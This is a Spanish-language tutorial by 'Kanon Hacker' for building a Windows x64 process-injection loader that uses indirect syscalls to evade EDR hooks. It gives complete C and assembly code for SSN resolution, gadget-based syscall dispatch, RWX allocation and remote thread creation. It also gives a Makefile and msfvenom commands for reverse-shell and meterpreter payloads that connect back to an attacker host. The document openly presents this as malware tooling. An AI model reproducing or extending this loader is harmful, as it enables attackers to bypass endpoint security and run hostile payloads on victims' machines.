# Windows x64 Syscall Loader — Tutorial Completo

> **Autor:** Kanon Hacker  
> **Nivel:** Avanzado (requiere conocimientos de C, ASM x64, Windows Internals)  
> **Toolchain:** Linux + mingw-w64 cross-compilation → Windows x64 PE  
> **Filosofía:** Cero WinAPI. Todo por syscall directo/indirecto.

---

## Índice

1. [Teoría — Lo que necesitás saber antes de escribir una línea](#1-teoría)
2. [Entorno — Toolchain y estructura del proyecto](#2-entorno)
3. [Arquitectura — Diseño del loader](#3-arquitectura)
4. [Implementación — Paso a paso](#4-implementación)
5. [Compilación — Makefile y flags críticos](#5-compilación)
6. [Debugging — Cómo encontrar bugs sin morir en el intento](#6-debugging)
7. [Payload — Integración con msfvenom](#7-payload)
8. [Verificación — Lista de comprobación pre-ejecución](#8-verificación)
9. [Pitfalls — Los 10 errores que TODO el mundo comete](#9-pitfalls)
10. [Referencias](#10-referencias)

---

## 1. Teoría

### 1.1 ¿Qué es un syscall?

Un **system call** (syscall) es la interfaz entre el modo usuario (ring 3) y el kernel (ring 0) en Windows. Toda operación privilegiada — asignar memoria, escribir en otro proceso, crear hilos — pasa por un syscall.

```
[tu código] → ntdll.dll → syscall → kernel (ntoskrnl.exe) → hardware
```

### 1.2 ¿Por qué syscalls directos?

Los EDR (Endpoint Detection and Response) hookean las funciones de `ntdll.dll`. Cuando tu malware llama a `NtAllocateVirtualMemory`, el EDR intercepta la llamada, la analiza, y decide si bloquearte.

**Syscall directo:** ejecutás la instrucción `syscall` vos mismo, saltándote el hook del EDR.

```
[tu código] → syscall → kernel
                ↑
           (EDR no ve esto)
```

### 1.3 La instrucción `syscall` (x64)

Cuando el CPU ejecuta `syscall`:
```
RCX ← RIP          (guarda dirección de retorno)
R11 ← RFLAGS       (guarda flags)
RIP ← IA32_LSTAR   (MSR 0xC0000082 → KiSystemCall64 del kernel)
```

**CRÍTICO: RSP NO cambia.** El kernel lee los parámetros del stack de usuario.

### 1.4 El ABI del kernel (qué registros/stack usa)

El kernel (`KiSystemCall64`) espera:

| Parámetro | Ubicación | Nota |
|-----------|-----------|------|
| Número de syscall (SSN) | **eax** | Índice en la System Service Dispatch Table |
| arg1 | **r10** | NO rcx — `syscall` destruye rcx |
| arg2 | **rdx** | Directo de registro |
| arg3 | **r8** | Directo de registro |
| arg4 | **r9** | Directo de registro |
| arg5 | **[rsp+0x28]** | 8 (return addr) + 0x20 (shadow space) |
| arg6 | **[rsp+0x30]** | +8 por cada argumento adicional |
| argN | **[rsp+0x28 + (N-5)*8]** | |

### 1.5 Por qué el compilador C y el kernel coinciden (magia)

Cuando C llama a una función con >4 argumentos:
```c
NtWriteVirtualMemory(hProcess, baseAddr, buffer, size, &bytesWritten);
// rcx        rdx       r8       r9    [rsp+0x20]
```

El compilador coloca arg5 en `[rsp+0x20]` (ANTES del `call`).  
Al hacer `call`, el CPU apila la dirección de retorno → rsp disminuye 8 bytes.  
arg5 ahora está en `[rsp+0x28]` → **exactamente donde el kernel lo espera.**

**Conclusión:** No necesitás manipular el stack manualmente para syscalls.  
El compilador ya lo hace correctamente.

### 1.6 Syscalls directas vs indirectas

**Directa:**
```asm
mov r10, rcx
mov eax, 0x18       ; SSN de NtAllocateVirtualMemory
syscall             ; ← EL EDR PUEDE DETECTAR ESTO (está en tu código)
ret
```

**Indirecta (usada en este tutorial):**
```asm
; El syscall está DENTRO de ntdll.dll, no en tu código
push <dirección del gadget en ntdll>
ret                  ; "salta" al syscall dentro de ntdll
```

El EDR ve que la instrucción `syscall` se ejecuta desde `ntdll.dll` → no la marca como sospechosa.

### 1.7 SSN (System Service Number)

El SSN es el "ID" de la función del kernel. **Cambia con cada build de Windows.**  
No podés hardcodearlo. Hay que resolverlo en tiempo de ejecución.

**Método:** Leer los bytes del stub en `ntdll.dll`:
```
4C 8B D1    mov r10, rcx
B8 18 00    mov eax, 0x0018    ← bytes 4-5 = SSN
```

---

## 2. Entorno

### 2.1 Requisitos

- Linux (WSL, VM, o nativo)
- mingw-w64 (cross-compiler para Windows)
- Python 3 (para generación de assembly)
- msfvenom (para payloads — opcional)

### 2.2 Instalación de mingw-w64 (userspace)

```bash
# Descargar paquetes .deb
apt-get download gcc-mingw-w64-x86-64-posix binutils-mingw-w64-x86-64 \
  mingw-w64-common mingw-w64-x86-64-dev

# Extraer a userspace
mkdir -p /opt/data/mingw
for deb in /tmp/*mingw*.deb; do dpkg-deb -x "$deb" /opt/data/mingw; done

# Fix: Debian nombra el binario como gcc-posix
cd /opt/data/mingw/usr/bin
ln -sf x86_64-w64-mingw32-gcc-posix x86_64-w64-mingw32-gcc
ln -sf x86_64-w64-mingw32-g++-posix x86_64-w64-mingw32-g++

# Agregar al PATH
export PATH="/opt/data/mingw/usr/bin:$PATH"
```

Verificar:
```bash
x86_64-w64-mingw32-gcc --version
# x86_64-w64-mingw32-gcc (GCC) 14-posix
```

### 2.3 Estructura del proyecto

```
syscall-loader/
├── include/
│   ├── structs.h        # PEB, TEB, UNICODE_STRING, etc.
│   └── syscalls.h       # Prototipos de funciones Nt*
├── src/
│   ├── syscalls.c        # Stubs de syscall (naked)
│   ├── resolve.c         # Resolución dinámica de SSNs
│   ├── loader.c          # Lógica principal del loader
│   └── syscalls.S        # Assembly (GAS .intel_syntax)
├── payload/
│   └── payload.bin       # Shellcode (msfvenom o custom)
├── obj/                  # Objetos intermedios
├── bin/                  # Output final (.exe)
├── Makefile
└── README.md
```

### 2.4 Conocimientos previos necesarios

| Tema | Nivel mínimo |
|------|-------------|
| C (punteros, structs, casting) | Intermedio |
| Assembly x64 (registros, calling conventions) | Básico |
| Windows PE format (DOS header, NT headers, sections) | Básico |
| Windows Internals (PEB, TEB, LDR) | Básico |
| Makefile / compilación cruzada | Básico |

---

## 3. Arquitectura

### 3.1 Diagrama de flujo

```
main()
  │
  ├─ 1. GetPID()          ← PEB/TEB o GetCurrentProcessId
  │
  ├─ 2. ResolveSSNs()     ← PEB walk → ntdll.dll → parse exports
  │     │
  │     └─ Para cada Nt* en ntdll:
  │          Lee bytes 4-5 del stub → SSN
  │          Busca "syscall; ret" → gadget address
  │
  ├─ 3. NtOpenProcess(PID)
  │     └─ SyscallExec(SSN=0x26, args...)
  │          │
  │          └─ push r12; ret → gadget en ntdll → syscall → kernel
  │
  ├─ 4. NtAllocateVirtualMemory(hProcess, &addr, ...)
  │     └─ SyscallExec(SSN=0x18, args...)
  │          │
  │          └─ addr = 0x640000 (ejemplo)
  │
  ├─ 5. volatile PVOID safe = addr   ← ¡CAPTURAR INMEDIATAMENTE!
  │
  ├─ 6. NtWriteVirtualMemory(hProcess, safe, payload, size, ...)
  │     └─ SyscallExec(SSN=0x3A, args...)
  │
  ├─ 7. NtCreateThreadEx(&hThread, ..., safe, ...)
  │     └─ SyscallExec(SSN=0xC9, args...)  ← 11 parámetros
  │
  └─ 8. Wait / Exit
```

### 3.2 ¿Qué va en C y qué va en Assembly?

| Componente | Lenguaje | Razón |
|-----------|----------|-------|
| PEB walk | C | Lógica compleja, punteros |
| Parse export table | C | Ídem |
| djb2 hash | C | Matemática simple |
| Stubs (Nt*Stub) | ASM | Deben ser naked, sin prólogo |
| SyscallExec | ASM | Manipula registros y stack directamente |
| Loader principal | C | Lógica de alto nivel |

### 3.3 Estructuras de datos clave

```c
// Información de cada syscall resuelto
typedef struct _SYSCALL_INFO {
    DWORD64 dwSsn;           // System Service Number
    PVOID   pAddress;        // Dirección del stub en ntdll
    PVOID   pSyscallRet;     // Dirección del gadget "syscall; ret"
    PVOID   pStubFunction;   // Dirección de nuestro stub
    DWORD64 dwHash;          // djb2 del nombre de la función
    BOOL    bIsHooked;       // ¿Está hookeado por EDR?
} SYSCALL_INFO;

// Tabla de syscalls
typedef struct _SYSCALL_LIST {
    DWORD64      Count;
    SYSCALL_INFO Entries[512];  // Hasta 512 syscalls
} SYSCALL_LIST;
```

---

## 4. Implementación

### 4.1 syscalls.S — El corazón del loader

#### 4.1.1 Stubs individuales

Cada función del kernel necesita un stub. El stub carga el índice en la tabla y salta al dispatcher:

```asm
.intel_syntax noprefix

.globl NtOpenProcessStub
NtOpenProcessStub:
    mov rax, [rip + qIdx0]     ; índice de NtOpenProcess en SyscallList
    jmp SyscallExec

.globl NtAllocateVirtualMemoryStub
NtAllocateVirtualMemoryStub:
    mov rax, [rip + qIdx4]
    jmp SyscallExec
```

Las variables `qIdx0`-`qIdx7` se inicializan en tiempo de ejecución cuando se resuelven los SSN.

#### 4.1.2 SyscallExec — Dispatcher compartido

```asm
SyscallExec:
    ; Guardar r12 en slot de memoria (r12 es callee-saved)
    mov [rip + qDebug], r12

    ; Guardar registros volátiles (5 pushes)
    push r9
    push r8
    push rdx
    push rcx
    push rbp
    mov rbp, rsp

    ; Buscar en SyscallList: Entries[rax]
    mov r12, rdx               ; preservar rdx
    mov rdx, [rip + qListEntrySize]  ; 0x30
    mul rdx                    ; rax = índice * 0x30
    mov rdx, r12               ; restaurar rdx
    mov r12, [rip + qTableAddr]      ; r12 = &SyscallList.Entries
    lea rax, [r12 + rax]       ; rax = &Entries[índice]
    mov r12, [rax + 0x10]      ; r12 = Entries[índice].pSyscallRet
    mov rax, [rax]             ; rax = Entries[índice].dwSsn

    ; Restaurar registros (5 pops)
    mov rsp, rbp
    pop rbp
    pop rcx
    pop rdx
    pop r8
    pop r9

    ; Preparar syscall
    mov r10, rcx               ; arg1 → r10 (kernel espera r10, no rcx)
    push r12                   ; apilar dirección del gadget
    mov r12, [rip + qDebug]    ; RESTAURAR r12 original
    ret                        ; "saltar" al gadget (syscall; ret en ntdll)
```

**Verificación del stack:**
- 5 pushes + 5 pops = balanceado
- `push r12; ret` = consume lo que apila → balanceado
- rsp al momento del `syscall` = rsp original
- `[rsp+0x28]` = arg5 correcto ✓

#### 4.1.3 Datos en .data

```asm
.section .data
qTableAddr:      .quad 0    ; puntero a SyscallList.Entries
qListEntrySize:  .quad 0x30 ; sizeof(SYSCALL_INFO) = 48 bytes
qIdx0:           .quad 0    ; índice para NtOpenProcess
qIdx1:           .quad 0    ; NtProtectVirtualMemory
qIdx2:           .quad 0    ; NtReadVirtualMemory
qIdx3:           .quad 0    ; NtWriteVirtualMemory
qIdx4:           .quad 0    ; NtAllocateVirtualMemory
qIdx5:           .quad 0    ; NtDelayExecution
qIdx6:           .quad 0    ; NtQueryVirtualMemory
qIdx7:           .quad 0    ; NtCreateThreadEx
```

### 4.2 resolve.c — Resolución dinámica de SSNs

#### 4.2.1 PEB walk para encontrar ntdll.dll

```c
static PVOID GetNtdllBase(VOID)
{
    // Leer PEB desde GS:[0x60]
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || pPeb->OSMajorVersion != 0x0A)  // Solo Windows 10+
        return NULL;

    // Recorrer lista de módulos cargados (InMemoryOrderModuleList)
    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;

    while (pEntry != pHead) {
        PLDR_DATA_TABLE_ENTRY pLdr = CONTAINING_RECORD(
            pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        // Comparar BaseDllName con "ntdll.dll" (case-insensitive)
        PWCHAR name = pLdr->BaseDllName.Buffer;
        if (name && (name[0]|32)=='n' && (name[1]|32)=='t' &&
            (name[2]|32)=='d' && (name[3]|32)=='l' && (name[4]|32)=='l')
        {
            return pLdr->DllBase;
        }
        pEntry = pEntry->Flink;
    }
    return NULL;
}
```

#### 4.2.2 Parse del Export Directory

```c
static DWORD64 GetSSN(PVOID pStub)
{
    // El stub estándar empieza con: mov r10, rcx; mov eax, SSN
    // Bytes: 4C 8B D1 B8 XX XX 00 00
    if (*(PBYTE)(pStub+0) == 0x4C && *(PBYTE)(pStub+1) == 0x8B &&
        *(PBYTE)(pStub+2) == 0xD1 && *(PBYTE)(pStub+3) == 0xB8 &&
        *(PBYTE)(pStub+6) == 0x00 && *(PBYTE)(pStub+7) == 0x00)
    {
        BYTE low  = *(PBYTE)(pStub + 4);
        BYTE high = *(PBYTE)(pStub + 5);
        return (high << 8) | low;
    }
    return -1;  // No es un stub estándar
}

static PVOID GetSyscallGadget(PVOID pStub)
{
    // Buscar "0F 05 C3" (syscall; ret) en los primeros 512 bytes
    for (DWORD i = 0; i < 512; i++) {
        if (*(PBYTE)(pStub+i) == 0x0F &&
            *(PBYTE)(pStub+i+1) == 0x05 &&
            *(PBYTE)(pStub+i+2) == 0xC3)
        {
            return (PVOID)((ULONG_PTR)pStub + i);
        }
    }
    return NULL;  // No tiene syscall inline
}
```

#### 4.2.3 Shared gadget (fallback para stubs sin syscall inline)

```c
// Buscar "0F 05 C3" en TODA la sección .text de ntdll
static PVOID FindSharedGadget(PVOID ntdllBase)
{
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if (*(PDWORD)pSec->Name == 'xet.') {  // ".text"
            PBYTE start = (PBYTE)ntdllBase + pSec->VirtualAddress;
            DWORD size  = pSec->Misc.VirtualSize;
            for (DWORD off = 0; off < size - 2; off++) {
                if (start[off] == 0x0F &&
                    start[off+1] == 0x05 &&
                    start[off+2] == 0xC3)
                {
                    return start + off;
                }
            }
        }
    }
    return NULL;
}
```

#### 4.2.4 Llenado de la SyscallList

```c
static BOOL FillSyscallTable(VOID)
{
    PVOID ntdll = GetNtdllBase();
    if (!ntdll) return FALSE;

    PVOID sharedGadget = FindSharedGadget(ntdll);
    // Si no hay shared gadget → error crítico

    // Parsear export directory
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)ntdll + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)ntdll + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);

    PDWORD pFunctions = (PDWORD)((PBYTE)ntdll + pExport->AddressOfFunctions);
    PDWORD pNames     = (PDWORD)((PBYTE)ntdll + pExport->AddressOfNames);
    PWORD  pOrdinals  = (PWORD)((PBYTE)ntdll + pExport->AddressOfNameOrdinals);

    DWORD idx = 0;
    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        PCHAR name = (PCHAR)((PBYTE)ntdll + pNames[i]);

        // Solo nos interesan funciones Nt* y Zw*
        if (*(USHORT*)name != 'tN' && *(USHORT*)name != 'wZ')
            continue;

        PVOID   addr = (PBYTE)ntdll + pFunctions[pOrdinals[i]];
        DWORD64 ssn  = GetSSN(addr);
        if (ssn == (DWORD64)-1) continue;  // No es stub estándar

        PVOID gadget = GetSyscallGadget(addr);
        if (!gadget) gadget = sharedGadget;  // Usar gadget compartido
        if (!gadget) continue;

        // Guardar en la tabla
        DWORD64 hash = djb2((PBYTE)name + 2);  // hash sin prefijo "Nt"/"Zw"
        SyscallList.Entries[idx].dwSsn        = ssn;
        SyscallList.Entries[idx].pAddress     = addr;
        SyscallList.Entries[idx].pSyscallRet  = gadget;
        SyscallList.Entries[idx].dwHash       = hash;

        // Mapear funciones críticas a índices fijos
        if (hash == 0x8AD1C604A65844A5) SetIdx(0, idx);  // NtOpenProcess
        if (hash == 0x989246E5A13FCBD9) SetIdx(4, idx);  // NtAllocateVirtualMemory
        if (hash == 0x0F4CE15C0758B33F) SetIdx(3, idx);  // NtWriteVirtualMemory
        if (hash == 0xB1C15967B96C5E5D) SetIdx(7, idx);  // NtCreateThreadEx
        // ... etc para las otras

        idx++;
        if (idx >= MAX_ENTRIES) break;
    }

    SyscallList.Count = idx;
    return idx >= 8;  // Necesitamos al menos las 8 críticas
}
```

### 4.3 loader.c — El loader principal

```c
#include <windows.h>
#include <intrin.h>
#include <stdio.h>

// Prototipos de nuestros stubs (naked, definidos en syscalls.S)
extern NTSTATUS NtOpenProcessStub(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
extern NTSTATUS NtAllocateVirtualMemoryStub(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
extern NTSTATUS NtWriteVirtualMemoryStub(HANDLE, PVOID, PVOID, ULONG, PULONG);
extern NTSTATUS NtCreateThreadExStub(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE,
                                      PVOID, PVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, PVOID);

// Wrappers NO-inline (previenen tail-call optimization)
__attribute__((noinline))
NTSTATUS NtAllocateVirtualMemory(HANDLE hProcess, PVOID* BaseAddress,
    ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
{
    volatile NTSTATUS s = NtAllocateVirtualMemoryStub(
        hProcess, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
    return s;
}

// Payload embebido (generado con msfvenom o custom)
static const unsigned char g_Payload[] = { 0xCC };  // INT3 para debug
static const SIZE_T g_PayloadSize = sizeof(g_Payload);

INT main(INT argc, CHAR* argv[])
{
    // === DECLARAR TODAS LAS VARIABLES AL TOP ===
    // (previene stack slot reuse con -Os)
    NTSTATUS       status;
    volatile PVOID shellAddr = NULL;  // volatile + top-scope
    volatile PVOID savedAddr = NULL;  // captura segura
    HANDLE         hProcess  = (HANDLE)-1;
    HANDLE         hThread   = NULL;
    DWORD          dwPID     = 0;
    SIZE_T         memSize;
    ULONG          bw;
    POBJECT_ATTRIBUTES oa;
    PCLIENT_ID    cid;

    // 1. Obtener PID
    if (argc >= 2) dwPID = (DWORD)atoi(argv[1]);
    if (dwPID == 0) dwPID = GetCurrentProcessId();  // self-injection

    // 2. Resolver SSNs (Rellenar SyscallList)
    if (!FillSyscallTable()) {
        printf("[!] Failed to resolve SSNs\n");
        return 1;
    }

    // 3. Abrir proceso target
    oa = HeapAlloc(sizeof(OBJECT_ATTRIBUTES));
    cid = HeapAlloc(sizeof(CLIENT_ID));
    cid->UniqueProcess = (HANDLE)(ULONG_PTR)dwPID;
    status = NtOpenProcess(&hProcess,
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
        PROCESS_CREATE_THREAD | PROCESS_VM_READ,
        oa, cid);
    if (!NT_SUCCESS(status)) return 1;

    // 4. Allocar memoria en el target
    memSize = 0x1000;
    status = NtAllocateVirtualMemory(hProcess, (PVOID*)&shellAddr,
        0, &memSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) return 1;

    // 5. ¡CAPTURAR INMEDIATAMENTE! (antes de cualquier printf)
    savedAddr = shellAddr;

    // 6. Escribir payload
    bw = 0;
    status = NtWriteVirtualMemory(hProcess, (PVOID)savedAddr,
        (PVOID)g_Payload, g_PayloadSize, &bw);
    if (!NT_SUCCESS(status)) return 1;

    // 7. Crear thread
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
        hProcess, (PVOID)savedAddr, NULL, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) return 1;

    printf("[+] Payload injected at 0x%p\n", (void*)savedAddr);
    return 0;
}
```

---

## 5. Compilación

### 5.1 Makefile

```makefile
TC_BIN  := /opt/data/mingw/usr/bin
CC      := $(TC_BIN)/x86_64-w64-mingw32-gcc
OBJCOPY := $(TC_BIN)/x86_64-w64-mingw32-objcopy
OBJDUMP := $(TC_BIN)/x86_64-w64-mingw32-objdump

SRC_DIR := src
INC_DIR := include
OBJ_DIR := obj
BIN_DIR := bin

# FLAGS CRÍTICOS — NO MODIFICAR SIN ENTENDER
# -fno-asynchronous-unwind-tables NUNCA USAR (elimina .pdata → Windows rechaza PE)
CFLAGS := -Os -s -ffunction-sections -fdata-sections \
          -I$(INC_DIR) -I$(SRC_DIR) \
          -Wall -Wextra \
          -Wno-unknown-pragmas -Wno-pointer-sign -Wno-multichar \
          -Wno-unused-parameter -Wno-unused-variable \
          -Wno-unused-function -Wno-sign-compare -Wno-format

# Linker flags para EXE
LFLAGS := -Wl,--gc-sections -Wl,--strip-all \
          -Wl,--disable-dynamicbase \
          -Wl,--subsystem=console \
          -lkernel32

all: $(BIN_DIR)/loader.exe

$(OBJ_DIR)/syscalls.o: $(SRC_DIR)/syscalls.S
	$(CC) -c $< -o $@

$(OBJ_DIR)/resolve.o: $(SRC_DIR)/resolve.c
	$(CC) -c $(CFLAGS) $< -o $@

$(OBJ_DIR)/loader.o: $(SRC_DIR)/loader.c
	$(CC) -c $(CFLAGS) $< -o $@

$(BIN_DIR)/loader.exe: $(OBJ_DIR)/syscalls.o $(OBJ_DIR)/resolve.o $(OBJ_DIR)/loader.o
	@mkdir -p $(BIN_DIR)
	$(CC) $(LFLAGS) $^ -o $@

# Verificación post-compilación
check: $(BIN_DIR)/loader.exe
	@echo "=== .pdata presente? ==="
	@$(OBJDUMP) -h $< | grep pdata || echo "ERROR: .pdata no encontrado"
	@echo "=== Entry point ==="
	@$(OBJDUMP) -f $< | grep start
	@echo "=== Imports ==="
	@$(OBJDUMP) -p $< | grep "DLL Name"

clean:
	rm -rf $(OBJ_DIR)/*.o $(BIN_DIR)/*.exe
```

### 5.2 Flags prohibidos

| Flag | Efecto | Consecuencia |
|------|--------|-------------|
| `-fno-asynchronous-unwind-tables` | Elimina `.pdata` | **Windows NO carga el PE** |
| `-nostdlib` (sin EntryPoint explícito) | Sin CRT | Crash en startup |
| `-O0` (para release) | Sin optimizar | Binario enorme, lento |
| `-march=native` | Instrucciones específicas | No portable entre CPUs |

### 5.3 Flags recomendados

| Flag | Razón |
|------|-------|
| `-Os` | Optimizar por tamaño (pero cuidado con stack reuse) |
| `-s` | Strip símbolos |
| `-ffunction-sections -fdata-sections` | Permite `--gc-sections` |
| `--gc-sections` | Elimina código no usado |
| `--strip-all` | Binario mínimo |
| `--disable-dynamicbase` | Sin ASLR (no necesita .reloc) |

---

## 6. Debugging

### 6.1 El método de las 3 capas

Cuando algo falla, aplicá este orden:

**Capa 1 — ¿Está llegando el valor correcto?**
```c
volatile PVOID saved = variable;  // Capturar ANTES de cualquier printf
printf("[DBG] value = 0x%p\n", (void*)saved);
```

**Capa 2 — ¿Está funcionando el syscall?**
```c
status = NtXxx(...);
printf("[DBG] status = 0x%08lX\n", status);
// STATUS_SUCCESS = 0x00000000
// STATUS_ACCESS_DENIED = 0xC0000022
// STATUS_PARTIAL_COPY = 0x8000000D
```

**Capa 3 — ¿Qué ve el kernel?**
Agregar en SyscallExec justo antes de `push r12; ret`:
```asm
mov [rip + dbg_ssn], rax        ; SSN que recibe el kernel
mov [rip + dbg_rsp], rsp        ; Stack pointer
mov rax, [rsp + 0x28]
mov [rip + dbg_arg5], rax       ; arg5 que ve el kernel
mov rax, [rsp + 0x30]
mov [rip + dbg_arg6], rax       ; arg6 que ve el kernel
```

### 6.2 Payload mínimo para debugging

**Nivel 0 — INT3 (1 byte):**
```c
static const unsigned char g_Payload[] = { 0xCC };
```
Si x64dbg se para en la dirección → inyección funciona.

**Nivel 1 — Bucle infinito (2 bytes):**
```c
static const unsigned char g_Payload[] = { 0xEB, 0xFE };  // jmp $
```
El proceso se queda vivo → podés inspeccionar con Process Hacker.

**Nivel 2 — MessageBox (msfvenom):**
```bash
msfvenom -p windows/x64/messagebox TEXT="hola" TITLE="test" -f raw -o payload.bin
```

### 6.3 Checkpoint de verificación en x64dbg

```
1. Entry point breakpoint → ¿Se cargó el EXE?
2. DLL load events → ¿ntdll, kernel32, kernelbase cargados?
3. Thread create event → ¿Entry address correcta (no 0x00000000)?
4. Si Entry es 0 → bug en paso de parámetros (ver Capa 1)
5. Si Entry es correcto pero no llega → permisos de memoria (PAGE_EXECUTE_*)
6. EXCEPTION_BREAKPOINT en la dirección correcta → ¡éxito!
```

### 6.4 Errores comunes y sus códigos

| Status | Significado | Causa típica |
|--------|------------|-------------|
| 0x00000000 | STATUS_SUCCESS | Todo bien |
| 0xC0000022 | STATUS_ACCESS_DENIED | Falta PROCESS_VM_READ/WRITE |
| 0xC0000005 | ACCESS_VIOLATION | Dirección inválida o DEP |
| 0xC0000008 | STATUS_INVALID_HANDLE | Handle cerrado o inválido |
| 0x8000000D | STATUS_PARTIAL_COPY | Memoria no accesible parcialmente |
| 0x80000003 | EXCEPTION_BREAKPOINT | ¡Llegó a tu INT3! Éxito |
| 0xC00000BB | STATUS_NOT_SUPPORTED | SSN incorrecto (función equivocada) |

---

## 7. Payload

### 7.1 Generar con msfvenom

```bash
# MessageBox
msfvenom -p windows/x64/messagebox \
  TEXT="hola mundo soy kanon" \
  TITLE="Kanon Hacker" \
  ICON=INFORMATION \
  EXITFUNC=thread \
  -f raw -o payload.bin

# Reverse shell
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  EXITFUNC=thread \
  -f raw -o payload.bin

# Custom (meterpreter, etc.)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw -o payload.bin
```

### 7.2 Convertir .bin a array C

```python
import sys
with open(sys.argv[1], 'rb') as f:
    data = f.read()

print(f'static const unsigned char g_Payload[{len(data)}] = {{')
for i in range(0, len(data), 16):
    chunk = data[i:i+16]
    hex_str = ', '.join(f'0x{b:02X}' for b in chunk)
    print(f'    {hex_str},')
print('};')
print(f'static const SIZE_T g_PayloadSize = {len(data)};')
```

### 7.3 Embeder en el loader

```c
// Pegar la salida del script anterior
static const unsigned char g_Payload[347] = {
    0xFC, 0x48, 0x81, 0xE4, /* ... */ 0xFF, 0xD5,
};
static const SIZE_T g_PayloadSize = sizeof(g_Payload);
```

---

## 8. Verificación

### 8.1 Checklist pre-ejecución

```
[ ] objdump -h loader.exe | grep pdata      # ¿.pdata existe?
[ ] objdump -f loader.exe                    # ¿EntryPoint correcto?
[ ] objdump -p loader.exe | grep "DLL Name"  # ¿Solo kernel32.dll?
[ ] objdump -d loader.o | grep syscall       # ¿0 syscalls inline? (debe ser 0 para indirecto)
[ ] objdump -d loader.o | grep SyscallExec   # ¿Existe el dispatcher?
[ ] Payload mínimo (0xCC) probado primero    # ¿Funciona la inyección básica?
```

### 8.2 Verificación en runtime (con DBG)

```
[ ] NtOpenProcess → STATUS_SUCCESS
[ ] NtAllocateVirtualMemory → STATUS_SUCCESS, addr != NULL
[ ] volatile saved = addr → capturado
[ ] NtWriteVirtualMemory → STATUS_SUCCESS, bytes escritos = tamaño payload
[ ] NtCreateThreadEx → STATUS_SUCCESS
[ ] x64dbg: Thread created con Entry = dirección correcta
[ ] EXCEPTION_BREAKPOINT o MessageBox visible
```

---

## 9. Pitfalls

### Los 10 errores que TODO el mundo comete

#### #1 — `-Os` stack slot reuse
```c
// MAL — bw pisa shellAddress en el stack
NTSTATUS status = NtAlloc(..., &shellAddress, ...);
ULONG bw = 0;  // ← este = 0 SOBRESCRIBE shellAddress!

// BIEN — capturar inmediatamente
NTSTATUS status = NtAlloc(..., &shellAddress, ...);
volatile PVOID safe = shellAddress;  // ← ANTES de cualquier declaración
ULONG bw = 0;
NtWrite(..., (PVOID)safe, ...);      // ← usar safe, no shellAddress
```

#### #2 — Olvidar PROCESS_VM_READ
```c
// MAL — NtReadVirtualMemory devuelve ACCESS_DENIED
NtOpenProcess(&h, PROCESS_VM_WRITE | PROCESS_VM_OPERATION, ...);

// BIEN
NtOpenProcess(&h, PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ, ...);
```

#### #3 — r12 no guardado en SyscallExec
`r12` es **callee-saved**. Si tu SyscallExec lo pisa, el caller crashea.
```asm
; Guardar al entrar
mov [rip + saveSlot], r12
; ... usar r12 como temporal ...
; Restaurar al salir
mov r12, [rip + saveSlot]
```

#### #4 — Tail-call en wrappers
```c
// MAL — compilador hace jmp en vez de call (sin stack frame)
NTSTATUS NtCreateThreadEx(args...) {
    return NtCreateThreadExStub(args...);  // tail-call!
}

// BIEN
__attribute__((noinline))
NTSTATUS NtCreateThreadEx(args...) {
    volatile NTSTATUS s = NtCreateThreadExStub(args...);
    return s;
}
```

#### #5 — `-fno-asynchronous-unwind-tables`
**NUNCA USAR.** Elimina `.pdata` → Windows no carga el PE.  
Síntoma: el proceso ni siquiera arranca. No llega al entry point.

#### #6 — SSNs hardcodeados
Los SSNs cambian con cada build de Windows.  
El SSN que funciona en tu VM no funciona en el target.

#### #7 — No verificar el Entry address
Si x64dbg muestra `Entry: 0000000000000000`, tu StartRoutine es NULL.  
No es bug del stub — es bug del loader (ver #1).

#### #8 — printf entre syscalls
`printf` usa stack. Su stack frame puede solapar con tus variables.  
Si necesitás debug, capturá valores ANTES de llamar a printf.

#### #9 — Usar `syscall` inline en vez de indirecto
```asm
; MAL — EDR detecta syscall en tu código
syscall

; BIEN — syscall está en ntdll.dll
push <gadget_en_ntdll>
ret
```

#### #10 — Mid-function variable declarations
```c
// MAL
void foo() {
    int x = bar();
    int y = 0;  // puede pisar x en el stack con -Os
}

// BIEN
void foo() {
    int x, y;   // todas al principio
    x = bar();
    y = 0;
}
```

---

## 10. Referencias

| Recurso | URL |
|---------|-----|
| j00ru Syscall Tables (SSNs por build) | https://j00ru.vexillium.org/syscalls/nt/64/ |
| Microsoft x64 Calling Convention | https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention |
| SysWhispers3 (indirect syscalls) | https://github.com/klezVirus/SysWhispers3 |
| HookChain (original, IAT + indirect) | https://github.com/helviojunior/hookchain |
| Windows Internals Book (7th ed) | Capítulos 7-8 (PEB, LDR, System Service Dispatch) |
